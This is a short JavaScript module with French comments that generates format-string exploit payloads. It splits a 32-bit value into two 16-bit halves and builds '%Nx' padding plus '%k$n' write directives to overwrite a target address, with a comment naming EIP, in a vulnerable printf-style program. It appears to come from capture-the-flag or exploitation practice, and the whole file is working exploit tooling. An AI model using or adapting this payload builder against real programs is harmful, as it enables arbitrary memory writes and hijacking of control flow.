function writeToAddress (bytesWritten, relativePosition, value) {
  console.log('bytesWritten', bytesWritten)
  console.log('relativePosition', relativePosition)
  console.log('value', (value).toString(16))
  let msb = (value >> (2 * 8)) & 0x0000FFFF
  let lsb = value & 0x0000FFFF
  console.log('msb', msb)
  console.log('lsb', lsb)

  // /!\ ATTENTION /!\
  // msb doit être écrit 2 octets APRÈS lsb
  // si eip est à 0xbfff0000
  // lsb addr = 0xbfff0000
  // msb addr = 0xbfff0002

  // comme on écrit toujours sur 4 octets, la séquence d'écriture est la suivante:
  // soit XXXX|0000|XXXX où AAAA est là où on veut écrire
  // d'abord on écrit les least significant bytes (lsb)
  // soit XXXX|00LL|XXXX  où LL est la zone où les octets valent lsb
  // ensuite on écrit msb, décalé de 2 octets:
  // soit XX00|MMLL|XXXX, et on a écrasé la zone juste avant, mais tout est bien écrit

  // second problème: lsb doit être écrit avant msb, et sa valeur doit donc être plus petite
  // car comme on écrit par rapport au nombre d'octets écrits, et que ce nombre ne fait que grandir
  // il faut impérativement que la première valeur écrite soit plus petite que la seconde valeur

  // si lsb est effectivement plus grand que msb, alors on rajoute 0x10000 à msb et on le décale d'un octet:
  // soit XX01|MMLL|XXXX ==> ça marche.
  if (lsb > msb) {
    msb = msb | 0x10000 // msb devient > lsb
  }

  // ensuite on doit calculer le nombre d'octets à écrire
  // on part de bytesWritten, et on ajoute d'abord le nombre d'octets à écrire pour correspondre à lsb
  const lsbRest = lsb - bytesWritten
  const lsbString = '%' + lsbRest + 'x' // octets à écrire

  const msbRest = msb - lsbRest - bytesWritten
  const msbString = '%' + msbRest + 'x' // octets à écrire

  // on écrit le lsb et le msb aux adresses écrites à relativePosition et relativePosition + 1
  const lsbPos = '%' + relativePosition + '$n'
  const msbPos = '%' + (relativePosition + 1) + '$n'

  const finalString = lsbString + lsbPos + msbString + msbPos
  return finalString
}

module.exports = writeToAddress
